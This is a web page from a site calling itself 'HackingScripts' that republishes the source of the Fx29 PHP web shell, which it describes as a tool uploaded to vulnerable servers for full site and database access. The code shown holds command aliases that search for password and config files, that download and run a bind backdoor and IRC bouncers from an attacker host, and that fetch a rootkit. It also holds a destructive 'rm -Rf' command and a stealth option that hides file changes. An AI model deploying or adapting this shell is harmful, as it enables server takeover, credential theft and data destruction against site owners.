<!DOCTYPE html>
<html>
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <link rel="stylesheet" type="text/css" href="//stylesheets/stylesheet.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="//stylesheets/pygment_trac.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="//stylesheets/print.css" media="print" />
    <link rel="stylesheet" type="text/css" href="//stylesheets/styles.css" media="print" />
    <link rel="icon" type="image/x-icon" href="//favicon.ico">


    <!--[if lt IE 9]>
    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <title> FaTaLisTiCz_Fx Fx29 Shell </title>
  </head>

  <body>
    <header>
      <div class="inner">
        <h1> <a href="//">HackingScripts</a> </h1>
        <h2>Hack Scripts for everybody</h2>
      </div>
    </header>

    <div id="content-wrapper">
      <div class="inner clearfix">
        <section id="main-content">

          <h2>FaTaLisTiCz_Fx Fx29 Shell</h2>
<p class="meta">25 Jan 2014</p>

<p>This Fx29 shell script is uploaded to a vulnerable site&#8217;s server, and once there can be run by the hacker in a browser. It allows the attacker complete access to the site, including the database.</p>

<h3>FaTaLisTiCz_Fx Fx29Sh Shell Script Source Code</h3>

<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="lineno">   1</span> <span class="cp">&lt;?php</span>
<span class="lineno">   2</span> <span class="c1">##########################################################</span>
<span class="lineno">   3</span> <span class="c1">###[ FaTaLisTiCz_Fx Fx29Sh 3.2.12.08 ]###</span>
<span class="lineno">   4</span> <span class="c1">###[ By FaTaLisTiCz_Fx               ]###</span>
<span class="lineno">   5</span> <span class="c1">###[ ? 03-12 2008 FeeLCoMz Community ]###</span>
<span class="lineno">   6</span> <span class="c1">###[ Written under PHP 5.2.5         ]###</span>
<span class="lineno">   7</span> <span class="c1">##########################################################</span>
<span class="lineno">   8</span> <span class="nb">define</span><span class="p">(</span><span class="s1">&#39;sh_ver&#39;</span><span class="p">,</span><span class="s2">&quot;3.2.12.08&quot;</span><span class="p">);</span>        <span class="c1">###</span>
<span class="lineno">   9</span> <span class="c1">#error_reporting(E_ALL);             ###</span>
<span class="lineno">  10</span> <span class="nb">error_reporting</span><span class="p">(</span><span class="k">E_ERROR</span> <span class="o">|</span> <span class="k">E_PARSE</span><span class="p">);</span>  <span class="c1">###</span>
<span class="lineno">  11</span> <span class="c1">##########################################################</span>
<span class="lineno">  12</span> <span class="c1">#################################</span>
<span class="lineno">  13</span> <span class="c1">###[ CONFIGURATIONS ]###</span>
<span class="lineno">  14</span> <span class="c1">#################################</span>
<span class="lineno">  15</span> <span class="c1">###[ URL ]###</span>
<span class="lineno">  16</span> <span class="c1">#$sh_mainurl        = &quot;http://localhost/FX29SH/&quot;;</span>
<span class="lineno">  17</span> <span class="nv">$sh_mainurl</span>        <span class="o">=</span> <span class="s1">&#39;http://uaedesign.com/xml/&#39;</span><span class="p">;</span>
<span class="lineno">  18</span> <span class="nv">$fx29sh_updateurl</span>  <span class="o">=</span> <span class="nv">$sh_mainurl</span><span class="o">.</span><span class="s2">&quot;fx29sh_update.php&quot;</span><span class="p">;</span>
<span class="lineno">  19</span> <span class="nv">$fx29sh_sourcesurl</span> <span class="o">=</span> <span class="nv">$sh_mainurl</span><span class="o">.</span><span class="s2">&quot;fx29sh.txt&quot;</span><span class="p">;</span>
<span class="lineno">  20</span> <span class="nv">$sh_sourcez</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
<span class="lineno">  21</span>   <span class="s2">&quot;Fx29Sh&quot;</span>   <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="nv">$sh_mainurl</span><span class="o">.</span><span class="s2">&quot;cyberz.txt&quot;</span><span class="p">,</span><span class="s2">&quot;fx29sh.php&quot;</span><span class="p">),</span>
<span class="lineno">  22</span>   <span class="s2">&quot;psyBNC&quot;</span>   <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="nv">$sh_mainurl</span><span class="o">.</span><span class="s2">&quot;fx.tgz&quot;</span><span class="p">,</span><span class="s2">&quot;fx.tgz&quot;</span><span class="p">),</span>
<span class="lineno">  23</span>   <span class="s2">&quot;Eggdrop&quot;</span>  <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="nv">$sh_mainurl</span><span class="o">.</span><span class="s2">&quot;fxb.tgz&quot;</span><span class="p">,</span><span class="s2">&quot;fxb.tgz&quot;</span><span class="p">),</span>
<span class="lineno">  24</span>   <span class="s2">&quot;BindDoor&quot;</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="nv">$sh_mainurl</span><span class="o">.</span><span class="s2">&quot;bind.tgz&quot;</span><span class="p">,</span><span class="s2">&quot;bind.tgz&quot;</span><span class="p">),</span>
<span class="lineno">  25</span> <span class="p">);</span>
<span class="lineno">  26</span> <span class="c1">###[ AUTHENTICATION ]###</span>
<span class="lineno">  27</span> <span class="nv">$auth</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
<span class="lineno">  28</span>   <span class="s2">&quot;login&quot;</span>     <span class="o">=&gt;</span> <span class="s2">&quot;&quot;</span><span class="p">,</span>
<span class="lineno">  29</span>   <span class="s2">&quot;pass&quot;</span>      <span class="o">=&gt;</span> <span class="s2">&quot;&quot;</span><span class="p">,</span>
<span class="lineno">  30</span>   <span class="s2">&quot;md5pass&quot;</span>   <span class="o">=&gt;</span> <span class="s2">&quot;&quot;</span><span class="p">,</span>
<span class="lineno">  31</span>   <span class="s2">&quot;hostallow&quot;</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;*&quot;</span><span class="p">),</span>
<span class="lineno">  32</span>   <span class="s2">&quot;denied&quot;</span>    <span class="o">=&gt;</span> <span class="s2">&quot;&lt;a href=</span><span class="se">\&quot;</span><span class="si">$sh_mainurl\</span><span class="s2">&quot;</span><span class="o">&gt;</span><span class="s2">&quot;.sh_name().&quot;</span><span class="o">&lt;/</span><span class="nx">a</span><span class="o">&gt;:</span> <span class="nx">access</span> <span class="nx">denied</span><span class="o">!</span><span class="s2">&quot;,</span>
<span class="lineno">  33</span> <span class="s2">);</span>
<span class="lineno">  34</span> <span class="s2">###[ ADVANCED ]###</span>
<span class="lineno">  35</span> <span class="si">$tmp_dir</span><span class="s2">       = &quot;&quot;;</span>
<span class="lineno">  36</span> <span class="si">$log_email</span><span class="s2">     = &quot;</span><span class="nx">yankeemoore55</span><span class="o">@</span><span class="nx">gmail</span><span class="o">.</span><span class="nx">com</span><span class="s2">&quot;;</span>
<span class="lineno">  37</span> <span class="si">$sess_cookie</span><span class="s2">   = &quot;</span><span class="nx">fx29shcook</span><span class="s2">&quot;;</span>
<span class="lineno">  38</span> <span class="si">$sort_default</span><span class="s2">  = &quot;</span><span class="mi">0</span><span class="nx">a</span><span class="s2">&quot;; #Pengurutan, 0 - nomor kolom. &quot;</span><span class="nx">a</span><span class="s2">&quot;scending atau &quot;</span><span class="nx">d</span><span class="s2">&quot;escending</span>
<span class="lineno">  39</span> <span class="si">$sort_save</span><span class="s2">     = TRUE; #Simpan posisi pengurutan menggunakan cookies.</span>
<span class="lineno">  40</span> <span class="si">$copy_unset</span><span class="s2">    = FALSE; #Hapus file yg telah di-copy setelah dipaste</span>
<span class="lineno">  41</span> <span class="si">$gzipencode</span><span class="s2">    = TRUE;</span>
<span class="lineno">  42</span> <span class="si">$filestealth</span><span class="s2">   = TRUE; #TRUE, tidak merubah waktu modifikasi dan akses.</span>
<span class="lineno">  43</span> <span class="si">$hexdump_lines</span><span class="s2"> = 8;</span>
<span class="lineno">  44</span> <span class="si">$hexdump_rows</span><span class="s2">  = 24;</span>
<span class="lineno">  45</span> <span class="si">$auto_surl</span><span class="s2">     = TRUE;</span>
<span class="lineno">  46</span> <span class="s2">###[ QUICK COMMANDS ]###</span>
<span class="lineno">  47</span> <span class="s2">if (!is_windows()) {</span>
<span class="lineno">  48</span> <span class="s2">  #Unix</span>
<span class="lineno">  49</span> <span class="s2">  </span><span class="si">$cmdaliases</span><span class="s2"> = array(</span>
<span class="lineno">  50</span> <span class="s2">    array(&quot;</span><span class="k">List</span> <span class="nx">Directory</span><span class="s2">&quot;, &quot;</span><span class="nx">ls</span> <span class="o">-</span><span class="nx">al</span><span class="s2">&quot;),</span>
<span class="lineno">  51</span> <span class="s2">    array(&quot;</span><span class="nx">Find</span> <span class="nx">all</span> <span class="nx">suid</span> <span class="nx">files</span><span class="s2">&quot;, &quot;</span><span class="nx">find</span> <span class="o">/</span> <span class="o">-</span><span class="nx">type</span> <span class="nx">f</span> <span class="o">-</span><span class="nx">perm</span> <span class="o">-</span><span class="mo">04000</span> <span class="o">-</span><span class="nx">ls</span><span class="s2">&quot;),</span>
<span class="lineno">  52</span> <span class="s2">    array(&quot;</span><span class="nx">Find</span> <span class="nx">suid</span> <span class="nx">files</span> <span class="nx">in</span> <span class="nb">current</span> <span class="nb">dir</span><span class="s2">&quot;, &quot;</span><span class="nx">find</span> <span class="o">.</span> <span class="o">-</span><span class="nx">type</span> <span class="nx">f</span> <span class="o">-</span><span class="nx">perm</span> <span class="o">-</span><span class="mo">04000</span> <span class="o">-</span><span class="nx">ls</span><span class="s2">&quot;),</span>
<span class="lineno">  53</span> <span class="s2">    array(&quot;</span><span class="nx">Find</span> <span class="nx">all</span> <span class="nx">sgid</span> <span class="nx">files</span><span class="s2">&quot;, &quot;</span><span class="nx">find</span> <span class="o">/</span> <span class="o">-</span><span class="nx">type</span> <span class="nx">f</span> <span class="o">-</span><span class="nx">perm</span> <span class="o">-</span><span class="mo">02000</span> <span class="o">-</span><span class="nx">ls</span><span class="s2">&quot;),</span>
<span class="lineno">  54</span> <span class="s2">    array(&quot;</span><span class="nx">Find</span> <span class="nx">sgid</span> <span class="nx">files</span> <span class="nx">in</span> <span class="nb">current</span> <span class="nb">dir</span><span class="s2">&quot;, &quot;</span><span class="nx">find</span> <span class="o">.</span> <span class="o">-</span><span class="nx">type</span> <span class="nx">f</span> <span class="o">-</span><span class="nx">perm</span> <span class="o">-</span><span class="mo">02000</span> <span class="o">-</span><span class="nx">ls</span><span class="s2">&quot;),</span>
<span class="lineno">  55</span> <span class="s2">    array(&quot;</span><span class="nx">Find</span> <span class="nx">config</span><span class="o">.</span><span class="nx">inc</span><span class="o">.</span><span class="nx">php</span> <span class="nx">files</span><span class="s2">&quot;, &quot;</span><span class="nx">find</span> <span class="o">/</span> <span class="o">-</span><span class="nx">type</span> <span class="nx">f</span> <span class="o">-</span><span class="nx">name</span> <span class="nx">config</span><span class="o">.</span><span class="nx">inc</span><span class="o">.</span><span class="nx">php</span><span class="s2">&quot;),</span>
<span class="lineno">  56</span> <span class="s2">    array(&quot;</span><span class="nx">Find</span> <span class="nx">config</span><span class="o">*</span> <span class="nx">files</span><span class="s2">&quot;, &quot;</span><span class="nx">find</span> <span class="o">/</span> <span class="o">-</span><span class="nx">type</span> <span class="nx">f</span> <span class="o">-</span><span class="nx">name</span> <span class="nx">\</span><span class="s2">&quot;config*</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">),</span>
<span class="lineno">  57</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find config* files in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -type f -name </span><span class="se">\&quot;</span><span class="s2">config*</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">),</span>
<span class="lineno">  58</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find all writable folders and files&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -perm -2 -ls&quot;</span><span class="p">),</span>
<span class="lineno">  59</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find all writable folders and files in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -perm -2 -ls&quot;</span><span class="p">),</span>
<span class="lineno">  60</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find all writable folders&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -type d -perm -2 -ls&quot;</span><span class="p">),</span>
<span class="lineno">  61</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find all writable folders in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -type d -perm -2 -ls&quot;</span><span class="p">),</span>
<span class="lineno">  62</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find all service.pwd files&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -type f -name service.pwd&quot;</span><span class="p">),</span>
<span class="lineno">  63</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find service.pwd files in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -type f -name service.pwd&quot;</span><span class="p">),</span>
<span class="lineno">  64</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find all .htpasswd files&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -type f -name .htpasswd&quot;</span><span class="p">),</span>
<span class="lineno">  65</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find .htpasswd files in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -type f -name .htpasswd&quot;</span><span class="p">),</span>
<span class="lineno">  66</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find all .bash_history files&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -type f -name .bash_history&quot;</span><span class="p">),</span>
<span class="lineno">  67</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find .bash_history files in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -type f -name .bash_history&quot;</span><span class="p">),</span>
<span class="lineno">  68</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find all .fetchmailrc files&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -type f -name .fetchmailrc&quot;</span><span class="p">),</span>
<span class="lineno">  69</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find .fetchmailrc files in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -type f -name .fetchmailrc&quot;</span><span class="p">),</span>
<span class="lineno">  70</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;List file attributes on a Linux second extended file system&quot;</span><span class="p">,</span> <span class="s2">&quot;lsattr -va&quot;</span><span class="p">),</span>
<span class="lineno">  71</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Show opened ports&quot;</span><span class="p">,</span> <span class="s2">&quot;netstat -an | grep -i listen&quot;</span><span class="p">),</span>
<span class="lineno">  72</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;-----&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">),</span>
<span class="lineno">  73</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Logged in users&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">),</span>
<span class="lineno">  74</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Last connect&quot;</span><span class="p">,</span><span class="s2">&quot;lastlog&quot;</span><span class="p">),</span>
<span class="lineno">  75</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find Suid bins&quot;</span><span class="p">,</span><span class="s2">&quot;find /bin /usr/bin /usr/local/bin /sbin /usr/sbin</span>
<span class="lineno">  76</span> <span class="s2">    /usr/local/sbin -perm -4000 2&gt; /dev/null&quot;</span><span class="p">),</span>
<span class="lineno">  77</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;User Without Password&quot;</span><span class="p">,</span><span class="s2">&quot;cut -d: -f1,2,3 /etc/passwd | grep ::&quot;</span><span class="p">),</span>
<span class="lineno">  78</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Inet Address&quot;</span><span class="p">,</span><span class="s2">&quot;/sbin/ifconfig | grep inet&quot;</span><span class="p">),</span>
<span class="lineno">  79</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Can write in /etc/?&quot;</span><span class="p">,</span><span class="s2">&quot;find /etc/ -type f -perm -o+w 2&gt; /dev/null&quot;</span><span class="p">),</span>
<span class="lineno">  80</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Downloaders?&quot;</span><span class="p">,</span><span class="s2">&quot;which wget curl w3m lynx fetch lwp-download&quot;</span><span class="p">),</span>
<span class="lineno">  81</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;CPU Info&quot;</span><span class="p">,</span><span class="s2">&quot;cat /proc/version /proc/cpuinfo&quot;</span><span class="p">),</span>
<span class="lineno">  82</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Is gcc installed ?&quot;</span><span class="p">,</span><span class="s2">&quot;locate gcc&quot;</span><span class="p">),</span>
<span class="lineno">  83</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Format box (DANGEROUS)&quot;</span><span class="p">,</span><span class="s2">&quot;rm -Rf&quot;</span><span class="p">),</span>
<span class="lineno">  84</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;-----&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">),</span>
<span class="lineno">  85</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;wget &amp; run psyBNC&quot;</span><span class="p">,</span><span class="s2">&quot;wget &quot;</span><span class="o">.</span><span class="nv">$sh_sourcez</span><span class="p">[</span><span class="s2">&quot;psyBNC&quot;</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;;tar -zxf &quot;</span><span class="o">.</span><span class="nv">$sh_sourcez</span><span class="p">[</span><span class="s2">&quot;psyBNC&quot;</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;;cd .fx;./config 29110;./fuck;./run&quot;</span><span class="p">),</span>
<span class="lineno">  86</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;wget &amp; extract EggDrop&quot;</span><span class="p">,</span><span class="s2">&quot;wget &quot;</span><span class="o">.</span><span class="nv">$sh_sourcez</span><span class="p">[</span><span class="s2">&quot;Eggdrop&quot;</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;;tar -zxf &quot;</span><span class="o">.</span><span class="nv">$sh_sourcez</span><span class="p">[</span><span class="s2">&quot;psyBNC&quot;</span><span class="p">][</span><span class="mi">1</span><span class="p">]),</span>
<span class="lineno">  87</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;wget &amp; run BindDoor&quot;</span><span class="p">,</span><span class="s2">&quot;wget &quot;</span><span class="o">.</span><span class="nv">$sh_sourcez</span><span class="p">[</span><span class="s2">&quot;BindDoor&quot;</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;;tar -zxvf &quot;</span><span class="o">.</span><span class="nv">$sh_sourcez</span><span class="p">[</span><span class="s2">&quot;BindDoor&quot;</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;;./bind&quot;</span><span class="p">),</span>
<span class="lineno">  88</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;-----&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">),</span>
<span class="lineno">  89</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;wget RatHole 1.2 (Linux &amp; BSD)&quot;</span><span class="p">,</span><span class="s2">&quot;wget http://packetstormsecurity.org/UNIX/penetration/rootkits/rathole-1.2.tar.gz&quot;</span><span class="p">),</span>
<span class="lineno">  90</span>   <span class="p">);</span>
<span class="lineno">  91</span> <span class="p">}</span>
<span class="lineno">  92</span> <span class="k">else</span> <span class="p">{</span>
<span class="lineno">  93</span>   <span class="c1">#Windows</span>
<span class="lineno">  94</span>   <span class="nv">$cmdaliases</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
<span class="lineno">  95</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;List Directory&quot;</span><span class="p">,</span> <span class="s2">&quot;dir&quot;</span><span class="p">),</span>
<span class="lineno">  96</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find index.php in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;dir /s /w /b index.php&quot;</span><span class="p">),</span>
<span class="lineno">  97</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find *config*.php in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;dir /s /w /b *config*.php&quot;</span><span class="p">),</span>
<span class="lineno">  98</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find c99shell in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find /c </span><span class="se">\&quot;</span><span class="s2">c99</span><span class="se">\&quot;</span><span class="s2"> *&quot;</span><span class="p">),</span>
<span class="lineno">  99</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find r57shell in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find /c </span><span class="se">\&quot;</span><span class="s2">r57</span><span class="se">\&quot;</span><span class="s2"> *&quot;</span><span class="p">),</span>
<span class="lineno"> 100</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find fx29shell in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find /c </span><span class="se">\&quot;</span><span class="s2">fx29</span><span class="se">\&quot;</span><span class="s2"> *&quot;</span><span class="p">),</span>
<span class="lineno"> 101</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Show active connections&quot;</span><span class="p">,</span> <span class="s2">&quot;netstat -an&quot;</span><span class="p">),</span>
<span class="lineno"> 102</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Show running services&quot;</span><span class="p">,</span> <span class="s2">&quot;net start&quot;</span><span class="p">),</span>
<span class="lineno"> 103</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;User accounts&quot;</span><span class="p">,</span> <span class="s2">&quot;net user&quot;</span><span class="p">),</span>
<span class="lineno"> 104</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Show computers&quot;</span><span class="p">,</span> <span class="s2">&quot;net view&quot;</span><span class="p">),</span>
<span class="lineno"> 105</span>   <span class="p">);</span>
<span class="lineno"> 106</span> <span class="p">}</span>
<span class="lineno"> 107</span> <span class="c1">###[ PHP FILESYSTEM (By FaTaLisTiCz_Fx) ]###</span>
<span class="lineno"> 108</span> <span class="nv">$phpfsaliases</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
<span class="lineno"> 109</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Read File&quot;</span><span class="p">,</span> <span class="s2">&quot;read&quot;</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s2">&quot;File&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">),</span>
<span class="lineno"> 110</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Write File (PHP5)&quot;</span><span class="p">,</span> <span class="s2">&quot;write&quot;</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="s2">&quot;File&quot;</span><span class="p">,</span><span class="s2">&quot;Text&quot;</span><span class="p">),</span>
<span class="lineno"> 111</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Copy&quot;</span><span class="p">,</span> <span class="s2">&quot;copy&quot;</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="s2">&quot;From&quot;</span><span class="p">,</span> <span class="s2">&quot;To&quot;</span><span class="p">),</span>
<span class="lineno"> 112</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Rename/Move&quot;</span><span class="p">,</span> <span class="s2">&quot;rename&quot;</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="s2">&quot;File&quot;</span><span class="p">,</span> <span class="s2">&quot;To&quot;</span><span class="p">),</span>
<span class="lineno"> 113</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Delete&quot;</span><span class="p">,</span> <span class="s2">&quot;delete&quot;</span><span class="p">,</span> <span class="mi">1</span> <span class="p">,</span><span class="s2">&quot;File&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">),</span>
<span class="lineno"> 114</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Make Dir&quot;</span><span class="p">,</span><span class="s2">&quot;mkdir&quot;</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s2">&quot;Dir&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">),</span>
<span class="lineno"> 115</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Download&quot;</span><span class="p">,</span> <span class="s2">&quot;download&quot;</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="s2">&quot;URL&quot;</span><span class="p">,</span> <span class="s2">&quot;To&quot;</span><span class="p">),</span>
<span class="lineno"> 116</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Download (Binary Safe)&quot;</span><span class="p">,</span> <span class="s2">&quot;downloadbin&quot;</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="s2">&quot;URL&quot;</span><span class="p">,</span> <span class="s2">&quot;To&quot;</span><span class="p">),</span>
<span class="lineno"> 117</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Change Perm (0755)&quot;</span><span class="p">,</span> <span class="s2">&quot;chmod&quot;</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="s2">&quot;File&quot;</span><span class="p">,</span> <span class="s2">&quot;Perms&quot;</span><span class="p">),</span>
<span class="lineno"> 118</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find Writable Dir&quot;</span><span class="p">,</span> <span class="s2">&quot;fwritabledir&quot;</span><span class="p">,</span> <span class="mi">2</span> <span class="p">,</span><span class="s2">&quot;Dir&quot;</span><span class="p">,</span> <span class="s2">&quot;Max&quot;</span><span class="p">),</span>
<span class="lineno"> 119</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Find Pathname Pattern&quot;</span><span class="p">,</span> <span class="s2">&quot;glob&quot;</span><span class="p">,</span><span class="mi">2</span> <span class="p">,</span><span class="s2">&quot;Dir&quot;</span><span class="p">,</span> <span class="s2">&quot;Pattern&quot;</span><span class="p">),</span>
<span class="lineno"> 120</span> <span class="p">);</span>
<span class="lineno"> 121</span> <span class="c1">###########################################</span>
<span class="lineno"> 122</span> <span class="c1">###[ END OF CONFIGURATIONS ]###</span>
<span class="lineno"> 123</span> <span class="c1">###########################################</span>
<span class="lineno"> 124</span> <span class="nb">define</span><span class="p">(</span><span class="s2">&quot;starttime&quot;</span><span class="p">,</span> <span class="nx">getmicrotime</span><span class="p">());</span>
<span class="lineno"> 125</span> <span class="o">@</span><span class="nb">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="lineno"> 126</span> <span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s2">&quot;max_execution_time&quot;</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
<span class="lineno"> 127</span> <span class="o">@</span><span class="nb">ignore_user_abort</span><span class="p">(</span><span class="k">TRUE</span><span class="p">);</span>
<span class="lineno"> 128</span> <span class="o">@</span><span class="nb">set_magic_quotes_runtime</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="lineno"> 129</span> <span class="k">if</span> <span class="p">(</span><span class="nb">get_magic_quotes_gpc</span><span class="p">())</span> <span class="p">{</span> <span class="nx">strips</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno"> 130</span> <span class="nv">$_REQUEST</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">);</span>
<span class="lineno"> 131</span> <span class="nv">$d</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;d&quot;</span><span class="p">];</span>
<span class="lineno"> 132</span> <span class="nv">$f</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;f&quot;</span><span class="p">];</span>
<span class="lineno"> 133</span> <span class="o">@</span><span class="nb">extract</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;fx29shcook&quot;</span><span class="p">]);</span>
<span class="lineno"> 134</span> <span class="k">foreach</span> <span class="p">(</span><span class="nv">$_REQUEST</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&gt;</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 135</span>   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$$k</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$$k</span> <span class="o">=</span> <span class="nv">$v</span><span class="p">;</span> <span class="p">}</span> <span class="c1">#Converting request to variable</span>
<span class="lineno"> 136</span> <span class="p">}</span>
<span class="lineno"> 137</span> <span class="c1">###[ SELF URL ]###</span>
<span class="lineno"> 138</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$auto_surl</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 139</span>   <span class="nv">$include</span> <span class="o">=</span> <span class="s2">&quot;&amp;&quot;</span><span class="p">;</span>
